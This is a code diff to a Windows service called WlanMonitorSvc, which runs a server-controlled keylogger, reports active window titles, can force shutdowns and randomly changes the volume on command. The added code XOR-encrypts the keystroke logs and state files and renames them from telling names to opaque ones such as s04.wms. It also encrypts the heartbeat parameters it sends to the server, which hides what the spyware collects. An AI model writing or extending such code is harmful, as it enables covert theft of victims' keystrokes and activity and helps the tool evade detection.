@@ -46,18 +46,23 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.8.26"
+#define MANUAL_COMPILE_VERSION "1.9.0"
+#define MANUAL_BUILD_CHANNEL "stable"
 // ==============================================================
 
 #define STRINGIZE2(x) #x
 #define STRINGIZE(x) STRINGIZE2(x)
 #pragma message("============================================================")
 #pragma message(">>> BUILDING WlanMonitorSvc VERSION: " MANUAL_COMPILE_VERSION)
+#pragma message(">>> BUILDING WlanMonitorSvc CHANNEL: " MANUAL_BUILD_CHANNEL)
 #pragma message(">>> If this is not the version you intend to publish, edit MANUAL_COMPILE_VERSION now.")
 #pragma message("============================================================")
 
 // 定义当前程序版本和服务器更新地址
 const std::string CURRENT_VERSION = MANUAL_COMPILE_VERSION;
+const std::string BUILD_CHANNEL = MANUAL_BUILD_CHANNEL;
+const std::string BUILD_VERSION_MARKER = "WLANMONITOR_BUILD_VERSION=" MANUAL_COMPILE_VERSION;
+const std::string BUILD_CHANNEL_MARKER = "WLANMONITOR_BUILD_CHANNEL=" MANUAL_BUILD_CHANNEL;
 // 在 Debug 构建时，优先连接本地测试服务器 (127.0.0.1:5000)
 #ifdef _DEBUG
 const std::string UPDATE_URL_BASE = "http://127.0.0.1:5000/update/"; // 本地测试服务 (Debug)
@@ -72,6 +77,26 @@ HANDLE g_hMutex = NULL;
 ULONGLONG g_ServiceStartTime = 0; // 存放程序/服务刚启动时的时间
 HHOOK g_hKeyHook = NULL;
 const char* UPDATE_EXIT_EVENT_NAME = "Global\\WlanMonitorSvc_UpdateExit_Event";
+const char* LOCAL_STATE_DIR = "C:\\Users\\Public\\WlanMonitorSvc_State";
+const char* ACTIVE_WND_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s01.wms";
+const char* VOLUME_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s02.wms";
+const char* KEYLOG_CFG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s03.wms";
+const char* KEYLOG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s04.wms";
+const char* MEDIA_BOUNCE_CFG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s05.wms";
+const char* WIFI_SHUTDOWN_EXEMPT_CFG = "C:\\Users\\Public\\WlanMonitorSvc_State\\s06.wms";
+const char* LEGACY_ACTIVE_WND_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\active_window.wms";
+const char* LEGACY_VOLUME_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\volume.wms";
+const char* LEGACY_KEYLOG_CFG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\keylog_cfg.wms";
+const char* LEGACY_KEYLOG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\keylog.wms";
+const char* LEGACY_MEDIA_BOUNCE_CFG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\media_bounce_cfg.wms";
+const char* LEGACY_WIFI_SHUTDOWN_EXEMPT_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\wifi_shutdown_exempt.wms";
+const char* LEGACY_ACTIVE_WND_TXT = "C:\\Users\\Public\\WlanMonitorSvc_ActiveWnd.txt";
+const char* LEGACY_VOLUME_TXT = "C:\\Users\\Public\\WlanMonitorSvc_Volume.txt";
+const char* LEGACY_KEYLOG_CFG_TXT = "C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt";
+const char* LEGACY_KEYLOG_TXT = "C:\\Users\\Public\\WlanMonitorSvc_Keylog.txt";
+const char* LEGACY_MEDIA_BOUNCE_CFG_TXT = "C:\\Users\\Public\\WlanMonitorSvc_MediaBounceCfg.txt";
+const char* LEGACY_WIFI_SHUTDOWN_EXEMPT_TXT = "C:\\Users\\Public\\WlanMonitorSvc_WifiShutdownExemptCfg.txt";
+std::atomic<ULONGLONG> g_LastSuccessfulHeartbeatTick{0};
 
 bool IsUpdateExitRequested() {
     HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, UPDATE_EXIT_EVENT_NAME);
@@ -643,12 +668,50 @@ bool IsUsableExeFile(const std::string& path) {
     return file.good() && mz[0] == 'M' && mz[1] == 'Z';
 }
 
+bool HasWirelessAdapterPresent() {
+    HANDLE hClient = NULL;
+    DWORD dwMaxClient = 2;
+    DWORD dwCurVersion = 0;
+    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
+    if (dwResult != ERROR_SUCCESS || hClient == NULL) {
+        return false;
+    }
+
+    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
+    bool hasWireless = false;
+    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
+    if (dwResult == ERROR_SUCCESS && pIfList != NULL) {
+        hasWireless = pIfList->dwNumberOfItems > 0;
+        WlanFreeMemory(pIfList);
+    }
+
+    WlanCloseHandle(hClient, NULL);
+    return hasWireless;
+}
+
+bool IsLikelyLaptopDevice() {
+    SYSTEM_POWER_STATUS status{};
+    if (!GetSystemPowerStatus(&status)) {
+        return false;
+    }
+
+    return status.BatteryFlag != 128 && status.BatteryFlag != 255;
+}
+
+std::string GetDeviceTypeForReport() {
+    if (IsLikelyLaptopDevice()) {
+        return "laptop";
+    }
+    return "desktop";
+}
+
 // 先声明，让后面可以调用
 std::string ExecCmd(const std::string& cmd, bool outputIsUtf8 = false);
 std::string GetMacAddress();
 std::string UrlEncode(const std::string& str);
 std::string EncryptString(const std::string& data);
 std::string DecryptString(const std::string& hexStr);
+void TrimString(std::string& s);
 
 // 加密实现：使用 XOR 和 Hex 编码
 std::string EncryptString(const std::string& data) {
@@ -687,6 +750,116 @@ std::string DecryptString(const std::string& hexStr) {
     return decrypted;
 }
 
+void EnsureLocalStateDir() {
+    CreateDirectoryA(LOCAL_STATE_DIR, NULL);
+}
+
+bool ReadWholeFile(const std::string& path, std::string& data) {
+    std::ifstream ifs(path, std::ios::binary);
+    if (!ifs.is_open()) {
+        return false;
+    }
+    data.assign((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+    return true;
+}
+
+bool WriteEncryptedLocalFile(const std::string& path, const std::string& plain) {
+    EnsureLocalStateDir();
+    std::ofstream ofs(path, std::ios::binary | std::ios::trunc);
+    if (!ofs.is_open()) {
+        return false;
+    }
+    std::string encrypted = EncryptString(plain);
+    ofs.write(encrypted.data(), encrypted.size());
+    return true;
+}
+
+bool ReadEncryptedLocalFile(const std::string& path, const std::string& legacyPath, std::string& plain) {
+    std::string encrypted;
+    if (ReadWholeFile(path, encrypted)) {
+        TrimString(encrypted);
+        plain = DecryptString(encrypted);
+        return true;
+    }
+
+    if (!legacyPath.empty() && ReadWholeFile(legacyPath, plain)) {
+        WriteEncryptedLocalFile(path, plain);
+        DeleteFileA(legacyPath.c_str());
+        return true;
+    }
+
+    return false;
+}
+
+void MigrateEncryptedStateName(const std::string& oldPath, const std::string& newPath) {
+    if (GetFileAttributesA(newPath.c_str()) != INVALID_FILE_ATTRIBUTES ||
+        GetFileAttributesA(oldPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+        return;
+    }
+
+    EnsureLocalStateDir();
+    MoveFileExA(oldPath.c_str(), newPath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
+}
+
+void MigrateObviousLocalStateNames() {
+    MigrateEncryptedStateName(LEGACY_ACTIVE_WND_STATE, ACTIVE_WND_STATE);
+    MigrateEncryptedStateName(LEGACY_VOLUME_STATE, VOLUME_STATE);
+    MigrateEncryptedStateName(LEGACY_KEYLOG_CFG_STATE, KEYLOG_CFG_STATE);
+    MigrateEncryptedStateName(LEGACY_KEYLOG_STATE, KEYLOG_STATE);
+    MigrateEncryptedStateName(LEGACY_MEDIA_BOUNCE_CFG_STATE, MEDIA_BOUNCE_CFG_STATE);
+    MigrateEncryptedStateName(LEGACY_WIFI_SHUTDOWN_EXEMPT_STATE, WIFI_SHUTDOWN_EXEMPT_CFG);
+}
+
+bool LocalStateExists(const std::string& path, const std::string& legacyPath) {
+    if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
+        return true;
+    }
+    if (!legacyPath.empty() && GetFileAttributesA(legacyPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+        std::string ignored;
+        ReadEncryptedLocalFile(path, legacyPath, ignored);
+        return true;
+    }
+    return false;
+}
+
+void DeleteLocalState(const std::string& path, const std::string& legacyPath) {
+    DeleteFileA(path.c_str());
+    if (!legacyPath.empty()) {
+        DeleteFileA(legacyPath.c_str());
+    }
+}
+
+void AppendEncryptedLocalFile(const std::string& path, const std::string& legacyPath, const std::string& addition) {
+    std::string existing;
+    ReadEncryptedLocalFile(path, legacyPath, existing);
+    existing += addition;
+    WriteEncryptedLocalFile(path, existing);
+}
+
+void MoveOrDeleteLegacyFile(const std::string& oldPath, const std::string& newPath) {
+    if (GetFileAttributesA(oldPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+        return;
+    }
+
+    if (GetFileAttributesA(newPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+        MoveFileExA(oldPath.c_str(), newPath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
+    } else {
+        DeleteFileA(oldPath.c_str());
+    }
+}
+
+void MigrateExeSideLogNames() {
+    std::string exePath = GetExePath();
+    std::string exeDir = exePath.substr(0, exePath.find_last_of("\\/"));
+    std::string mainLog = exeDir + "\\l01.wms";
+    std::string updaterLog = exeDir + "\\l02.wms";
+
+    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Log.txt", mainLog);
+    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Log.wmslog", mainLog);
+    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Updater_Log.txt", updaterLog);
+    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Updater_Log.wmslog", updaterLog);
+}
+
 // 独立异步线程上传本地日志到云端
 void UploadLogToServer() {
     std::thread([]() {
@@ -705,8 +878,8 @@ void UploadLogToServer() {
         };
 
         const LogUploadTarget targets[] = {
-            {"WlanMonitorSvc_Log.txt", "main"},
-            {"WlanMonitorSvc_Updater_Log.txt", "update"},
+            {"l01.wms", "main"},
+            {"l02.wms", "update"},
         };
 
         for (const auto& target : targets) {
@@ -722,10 +895,13 @@ void UploadLogToServer() {
     }).detach();
 }
 
-// 写入日志到程序同目录下的 WlanMonitorSvc_Log.txt
+// 写入加密日志到程序同目录下的 WlanMonitorSvc_Log.wmslog
 void WriteLog(const std::string& message) {
     std::string exePath = GetExePath();
-    std::string logPath = exePath.substr(0, exePath.find_last_of("\\/")) + "\\WlanMonitorSvc_Log.txt";
+    std::string exeDir = exePath.substr(0, exePath.find_last_of("\\/"));
+    std::string logPath = exeDir + "\\l01.wms";
+    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Log.txt", logPath);
+    MoveOrDeleteLegacyFile(exeDir + "\\WlanMonitorSvc_Log.wmslog", logPath);
 
     // 限制日志大小，超过则清空（防止日志无限增长）
     std::ifstream checkFile(logPath, std::ios::ate | std::ios::binary);
@@ -910,8 +1086,71 @@ void ForceShutdown() {
     WinExec("shutdown.exe -s -f -t 0", SW_HIDE);
 }
 
+bool EnableWifiRadioByWlanApi() {
+    HANDLE hClient = NULL;
+    DWORD dwMaxClient = 2;
+    DWORD dwCurVersion = 0;
+    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
+    if (dwResult != ERROR_SUCCESS || hClient == NULL) {
+        WriteLog("WLAN radio enable: WlanOpenHandle failed, error=" + std::to_string(dwResult));
+        return false;
+    }
+
+    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
+    bool changedAny = false;
+    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
+    if (dwResult == ERROR_SUCCESS && pIfList != NULL) {
+        for (DWORD i = 0; i < pIfList->dwNumberOfItems; ++i) {
+            PWLAN_RADIO_STATE pRadioState = NULL;
+            DWORD dataSize = 0;
+            WLAN_OPCODE_VALUE_TYPE opCodeType{};
+            DWORD queryResult = WlanQueryInterface(
+                hClient,
+                &pIfList->InterfaceInfo[i].InterfaceGuid,
+                wlan_intf_opcode_radio_state,
+                NULL,
+                &dataSize,
+                reinterpret_cast<PVOID*>(&pRadioState),
+                &opCodeType);
+
+            if (queryResult != ERROR_SUCCESS || pRadioState == NULL) {
+                WriteLog("WLAN radio enable: WlanQueryInterface radio_state failed for interface " + std::to_string(i) + ", error=" + std::to_string(queryResult));
+                continue;
+            }
+
+            WLAN_RADIO_STATE radioState = *pRadioState;
+            for (DWORD phy = 0; phy < radioState.dwNumberOfPhys && phy < WLAN_MAX_PHY_INDEX; ++phy) {
+                radioState.PhyRadioState[phy].dot11SoftwareRadioState = dot11_radio_state_on;
+            }
+            WlanFreeMemory(pRadioState);
+
+            DWORD setResult = WlanSetInterface(
+                hClient,
+                &pIfList->InterfaceInfo[i].InterfaceGuid,
+                wlan_intf_opcode_radio_state,
+                sizeof(radioState),
+                reinterpret_cast<PBYTE>(&radioState),
+                NULL);
+
+            if (setResult == ERROR_SUCCESS) {
+                changedAny = true;
+                WriteLog("WLAN radio enable: software radio turned on for interface " + std::to_string(i));
+            } else {
+                WriteLog("WLAN radio enable: WlanSetInterface failed for interface " + std::to_string(i) + ", error=" + std::to_string(setResult));
+            }
+        }
+        WlanFreeMemory(pIfList);
+    } else {
+        WriteLog("WLAN radio enable: WlanEnumInterfaces failed, error=" + std::to_string(dwResult));
+    }
+
+    WlanCloseHandle(hClient, NULL);
+    return changedAny;
+}
+
 void TryEnableWiFi() {
     WriteLog("尝试自动开启 WiFi/无线网卡...");
+    EnableWifiRadioByWlanApi();
     ExecCmd("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"try { Get-NetAdapter -Physical | Where-Object { $_.NdisPhysicalMedium -eq 9 -or $_.InterfaceDescription -match 'Wireless|Wi-Fi|WLAN|802.11' -or $_.Name -match 'Wi-Fi|WLAN|Wireless' } | Enable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue } catch {}\"", false);
     ExecCmd("netsh interface set interface name=\"Wi-Fi\" admin=enabled", false);
     ExecCmd("netsh interface set interface name=\"WLAN\" admin=enabled", false);
@@ -1533,44 +1772,53 @@ bool IsServerErrorResponse(const std::string& response) {
            lower.find("<!doctype") != std::string::npos;
 }
 
+std::string EncHeartbeatParam(const std::string& value) {
+    return UrlEncode(EncryptString(value));
+}
+
 // 向服务器报备上线
 void ReportToServer() {
     std::string mac = GetMacAddress();
-    std::string reportUrl = REPORT_URL_BASE + "?mac=" + UrlEncode(mac) + "&ver=" + UrlEncode(CURRENT_VERSION) + "&t=" + std::to_string(GetTickCount64());
+    std::string nonce = std::to_string(GetTickCount64()) + "_" + std::to_string(GetCurrentProcessId());
+    std::string reportUrl = REPORT_URL_BASE + "?mac=" + EncHeartbeatParam(mac) + "&ver=" + EncHeartbeatParam(CURRENT_VERSION) + "&t=" + std::to_string(GetTickCount64());
+    reportUrl += "&dtype=" + EncHeartbeatParam(GetDeviceTypeForReport());
+    reportUrl += "&wifi=" + EncHeartbeatParam(HasWirelessAdapterPresent() ? "1" : "0");
+    reportUrl += "&wex=" + EncHeartbeatParam(LocalStateExists(WIFI_SHUTDOWN_EXEMPT_CFG, LEGACY_WIFI_SHUTDOWN_EXEMPT_TXT) ? "1" : "0");
+    reportUrl += "&channel=" + EncHeartbeatParam(BUILD_CHANNEL);
+    reportUrl += "&build=" + EncHeartbeatParam(BUILD_CHANNEL_MARKER);
+    reportUrl += "&nonce=" + EncHeartbeatParam(nonce);
 
     static ULONGLONG lastFgRead = 0;
     static std::string lastFgStr = "";
     static std::string lastVolStr = "";
     if (GetTickCount64() - lastFgRead > 2000) {
         lastFgRead = GetTickCount64();
-        std::ifstream ifs("C:\\Users\\Public\\WlanMonitorSvc_ActiveWnd.txt");
-        if (ifs.is_open()) {
-            std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
+        std::string content;
+        if (ReadEncryptedLocalFile(ACTIVE_WND_STATE, LEGACY_ACTIVE_WND_TXT, content)) {
             TrimString(content);
             if (!content.empty()) {
-                lastFgStr = UrlEncode(AnsiToUtf8(content));
+                lastFgStr = AnsiToUtf8(content);
             } else {
                 lastFgStr = "";
             }
         }
-        std::ifstream vfs("C:\\Users\\Public\\WlanMonitorSvc_Volume.txt");
-        if (vfs.is_open()) {
-            std::string vcontent((std::istreambuf_iterator<char>(vfs)), (std::istreambuf_iterator<char>()));
+        std::string vcontent;
+        if (ReadEncryptedLocalFile(VOLUME_STATE, LEGACY_VOLUME_TXT, vcontent)) {
             TrimString(vcontent);
             lastVolStr = vcontent;
         }
     }
     if (!lastFgStr.empty()) {
-        reportUrl += "&fg=" + lastFgStr;
+        reportUrl += "&fg=" + EncHeartbeatParam(lastFgStr);
     }
     if (!lastVolStr.empty()) {
-        reportUrl += "&vol=" + lastVolStr;
+        reportUrl += "&vol=" + EncHeartbeatParam(lastVolStr);
     }
 
-    if (GetFileAttributesA("C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt") != INVALID_FILE_ATTRIBUTES) {
-        reportUrl += "&kl=" + UrlEncode("1");
+    if (LocalStateExists(KEYLOG_CFG_STATE, LEGACY_KEYLOG_CFG_TXT)) {
+        reportUrl += "&kl=" + EncHeartbeatParam("1");
     } else {
-        reportUrl += "&kl=" + UrlEncode("0");
+        reportUrl += "&kl=" + EncHeartbeatParam("0");
     }
 
     HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -1599,6 +1847,7 @@ void ReportToServer() {
                 response += buffer;
             }
             InternetCloseHandle(hConnect);
+            g_LastSuccessfulHeartbeatTick.store(GetTickCount64());
 
             TrimString(response); // 消除可能的隐藏换行符，避免指令匹不上
 
@@ -1801,23 +2050,17 @@ void ReportToServer() {
                             res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                         }
                     } else if (type == "KEYLOG_GET") {
-                        std::string logPath = "C:\\Users\\Public\\WlanMonitorSvc_Keylog.txt";
-                        std::ifstream ifs(logPath);
-                        if (ifs.is_open()) {
-                            std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
+                        std::string content;
+                        if (ReadEncryptedLocalFile(KEYLOG_STATE, LEGACY_KEYLOG_TXT, content)) {
                             res = content;
                         } else {
                             res = "No keylogger file found.";
                         }
                     } else if (type == "KEYLOG_DEL") {
-                        std::string logPath = "C:\\Users\\Public\\WlanMonitorSvc_Keylog.txt";
-                        if (DeleteFileA(logPath.c_str())) res = "Success: Keylog deleted.";
-                        else res = "Fail to delete keylog.";
+                        DeleteLocalState(KEYLOG_STATE, LEGACY_KEYLOG_TXT);
+                        res = "Success: Keylog deleted.";
                     } else if (type == "KEYENABLE") {
-                        std::string cfgPath = "C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt";
-                        std::ofstream ofs(cfgPath, std::ios::trunc);
-                        ofs << "1";
-                        ofs.close();
+                        WriteEncryptedLocalFile(KEYLOG_CFG_STATE, "1");
 
                         HANDLE hTestMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\WlanMonitorSvc_Keylog_Mutex");
                         if (!hTestMutex) {
@@ -1829,8 +2072,7 @@ void ReportToServer() {
                         }
                         res = "Success: Keylogger offline recording enabled.";
                     } else if (type == "KEYDISABLE") {
-                        std::string cfgPath = "C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt";
-                        DeleteFileA(cfgPath.c_str());
+                        DeleteLocalState(KEYLOG_CFG_STATE, LEGACY_KEYLOG_CFG_TXT);
                         res = "Success: Keylogger offline recording disabled. (Will fully stop on next boot or user logoff)";
                     } else if (type == "MEDIA") {
                         std::string exePath = GetExePath();
@@ -1857,11 +2099,8 @@ void ReportToServer() {
                             res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                         }
                     } else if (type == "MEDIA_BOUNCE") {
-                        std::string cfgPath = "C:\\Users\\Public\\WlanMonitorSvc_MediaBounceCfg.txt";
                         if (argStr == "1" || argStr == "on" || argStr == "true") {
-                            std::ofstream ofs(cfgPath, std::ios::trunc);
-                            ofs << "1";
-                            ofs.close();
+                            WriteEncryptedLocalFile(MEDIA_BOUNCE_CFG_STATE, "1");
 
                             HANDLE hBounceMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\WlanMonitorSvc_MediaBounce_Mutex");
                             if (!hBounceMutex) {
@@ -1873,8 +2112,16 @@ void ReportToServer() {
                             }
                             res = "Success: Local media bounce enabled.";
                         } else {
-                            DeleteFileA(cfgPath.c_str());
+                            DeleteLocalState(MEDIA_BOUNCE_CFG_STATE, LEGACY_MEDIA_BOUNCE_CFG_TXT);
                             res = "Success: Local media bounce disabled.";
+                        }
+                    } else if (type == "WIFI_SHUTDOWN_EXEMPT") {
+                        if (argStr == "1" || argStr == "on" || argStr == "true") {
+                            WriteEncryptedLocalFile(WIFI_SHUTDOWN_EXEMPT_CFG, "1");
+                            res = "Success: WiFi shutdown exemption enabled locally.";
+                        } else {
+                            DeleteLocalState(WIFI_SHUTDOWN_EXEMPT_CFG, LEGACY_WIFI_SHUTDOWN_EXEMPT_TXT);
+                            res = "Success: WiFi shutdown exemption disabled locally.";
                         }
                     } else if (type == "MONITOR_OFF") {
                         std::string exePath = GetExePath();
@@ -1994,7 +2241,7 @@ void MonitorWiFiLoop() {
 
         static ULONGLONG lastMediaBounceLaunch = 0;
         if (currentTime - lastMediaBounceLaunch >= 5000 || lastMediaBounceLaunch == 0) {
-            if (GetFileAttributesA("C:\\Users\\Public\\WlanMonitorSvc_MediaBounceCfg.txt") != INVALID_FILE_ATTRIBUTES) {
+            if (LocalStateExists(MEDIA_BOUNCE_CFG_STATE, LEGACY_MEDIA_BOUNCE_CFG_TXT)) {
                 HANDLE hBounceMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\WlanMonitorSvc_MediaBounce_Mutex");
                 if (!hBounceMutex) {
                     std::string exePath = GetExePath();
@@ -2050,11 +2297,16 @@ void MonitorWiFiLoop() {
 
         currentTime = GetTickCount64();
         bool shouldLog = false;
+        static bool isLikelyLaptop = IsLikelyLaptopDevice();
+        static bool hasWirelessHardware = HasWirelessAdapterPresent();
         // 10 分钟 = 10 * 60 * 1000 毫秒 = 600000
         if (lastLogTime == 0 || (currentTime - lastLogTime >= 600000)) {
             shouldLog = true;
             lastLogTime = currentTime;
+            hasWirelessHardware = HasWirelessAdapterPresent();
+            WriteLog("设备类型检测: " + GetDeviceTypeForReport() + ", wireless_adapter=" + std::string(hasWirelessHardware ? "1" : "0"));
         }
+        bool skipWifiShutdownForDesktopNoWifi = !isLikelyLaptop && !hasWirelessHardware;
 
         // 10 分钟检查一次自动更新 = 10 * 60 * 1000 = 600000 毫秒
         // 首次运行也会触发一次检测（由于 lastUpdateCheckTime = 0）
@@ -2137,6 +2389,29 @@ void MonitorWiFiLoop() {
         } else {
             if (shouldLog) WriteLog("WlanOpenHandle 失败(错误代码: " + std::to_string(dwResult) + ")，视同关闭。");
             isWifiOff = true;
+        }
+
+        if (skipWifiShutdownForDesktopNoWifi) {
+            if (isWifiOff && shouldLog) {
+                WriteLog("检测到台式机且没有无线网卡，跳过 WiFi 关闭后的 2 分钟关机保护。");
+            }
+            isWifiOff = false;
+            wifiOffStartTime = 0;
+            lastWifiEnableAttemptTime = 0;
+        }
+
+        bool wifiShutdownExempt = LocalStateExists(WIFI_SHUTDOWN_EXEMPT_CFG, LEGACY_WIFI_SHUTDOWN_EXEMPT_TXT);
+        ULONGLONG lastHeartbeat = g_LastSuccessfulHeartbeatTick.load();
+        bool serverReachableRecently = lastHeartbeat != 0 && (currentTime - lastHeartbeat) <= 45000;
+        if (isWifiOff && (wifiShutdownExempt || serverReachableRecently)) {
+            if (shouldLog) {
+                WriteLog(std::string("WiFi 被判定关闭，但") +
+                    (wifiShutdownExempt ? "本地免关机开关已开启" : "最近心跳仍可正常访问服务端") +
+                    "，跳过 2 分钟关机倒计时。");
+            }
+            isWifiOff = false;
+            wifiOffStartTime = 0;
+            lastWifiEnableAttemptTime = 0;
         }
 
         // 处理WiFi彻底关闭时的2分钟恢复窗口：先尝试开启，连续失败才关机。
@@ -2228,6 +2503,8 @@ void WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
 int main()
 {
     g_ServiceStartTime = GetTickCount64();
+    MigrateObviousLocalStateNames();
+    MigrateExeSideLogNames();
 
     std::string cmdLine = GetCommandLineA();
     if (cmdLine.find("-usermode") == std::string::npos && RecoverInterruptedUpdateIfNeeded()) {
@@ -2728,29 +3005,24 @@ int main()
                         CloseHandle(hProc);
                     }
                     std::string out = procName + "  [" + title + "]";
-                    std::ofstream ofs("C:\\Users\\Public\\WlanMonitorSvc_ActiveWnd.txt", std::ios::trunc);
-                    if (ofs) ofs << out;
+                    WriteEncryptedLocalFile(ACTIVE_WND_STATE, out);
 
                     // 新增：检测窗口切换并记录到按键日志
                     static std::string lastWindow = "";
                     if (lastWindow != out) {
                         lastWindow = out;
-                        if (GetFileAttributesA("C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt") != INVALID_FILE_ATTRIBUTES) {
-                            std::ofstream kfs("C:\\Users\\Public\\WlanMonitorSvc_Keylog.txt", std::ios::app);
-                            if (kfs) {
-                                kfs << "\n\n[Active Software: " << out << "]\n";
-                            }
+                        if (LocalStateExists(KEYLOG_CFG_STATE, LEGACY_KEYLOG_CFG_TXT)) {
+                            AppendEncryptedLocalFile(KEYLOG_STATE, LEGACY_KEYLOG_TXT, "\n\n[Active Software: " + out + "]\n");
                         }
                     }
                 }
 
                 int vol = GetVolumeNative();
                 if (vol >= 0) {
-                    std::ofstream vfs("C:\\Users\\Public\\WlanMonitorSvc_Volume.txt", std::ios::trunc);
-                    if (vfs) vfs << vol;
+                    WriteEncryptedLocalFile(VOLUME_STATE, std::to_string(vol));
                 }
 
-                bool keylogEnabled = (GetFileAttributesA("C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt") != INVALID_FILE_ATTRIBUTES);
+                bool keylogEnabled = LocalStateExists(KEYLOG_CFG_STATE, LEGACY_KEYLOG_CFG_TXT);
                 if (keylogEnabled && g_hKeyHook == NULL) {
                     g_hKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
                         if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
@@ -2783,12 +3055,7 @@ int main()
                                 }
                             }
                             if(!text.empty()) {
-                                std::string logPath = "C:\\Users\\Public\\WlanMonitorSvc_Keylog.txt";
-                                std::ofstream ofs(logPath, std::ios::app);
-                                if(ofs) {
-                                    ofs << text;
-                                    ofs.close();
-                                }
+                                AppendEncryptedLocalFile(KEYLOG_STATE, LEGACY_KEYLOG_TXT, text);
                             }
                         }
                         return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
@@ -2870,20 +3137,15 @@ int main()
             }
 
             std::srand((unsigned int)(std::time(nullptr) ^ GetCurrentProcessId()));
-            const char* cfgPath = "C:\\Users\\Public\\WlanMonitorSvc_MediaBounceCfg.txt";
             WriteLog("MEDIA_BOUNCE local volume randomizer started.");
-            while (GetFileAttributesA(cfgPath) != INVALID_FILE_ATTRIBUTES) {
+            while (LocalStateExists(MEDIA_BOUNCE_CFG_STATE, LEGACY_MEDIA_BOUNCE_CFG_TXT)) {
                 if (IsUpdateExitRequested()) {
                     WriteLog("MEDIA_BOUNCE received update exit request.");
                     break;
                 }
                 int vol = std::rand() % 101;
                 SetVolumeNative(vol);
-                std::ofstream vfs("C:\\Users\\Public\\WlanMonitorSvc_Volume.txt", std::ios::trunc);
-                if (vfs.is_open()) {
-                    vfs << vol;
-                    vfs.close();
-                }
+                WriteEncryptedLocalFile(VOLUME_STATE, std::to_string(vol));
                 Sleep(5000);
             }
             WriteLog("MEDIA_BOUNCE local volume randomizer stopped.");
@@ -2956,9 +3218,8 @@ int main()
 
             // 最后兜底：从当前前台窗口信息中提取媒体标题（适配浏览器/播放器未暴露SMTC的场景）
             if (!isPlaying || song.empty()) {
-                std::ifstream ifs("C:\\Users\\Public\\WlanMonitorSvc_ActiveWnd.txt");
-                if (ifs.is_open()) {
-                    std::string wnd((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
+                std::string wnd;
+                if (ReadEncryptedLocalFile(ACTIVE_WND_STATE, LEGACY_ACTIVE_WND_TXT, wnd)) {
                     TrimString(wnd);
                     std::string low = wnd;
                     for (char& ch : low) ch = (char)tolower((unsigned char)ch);
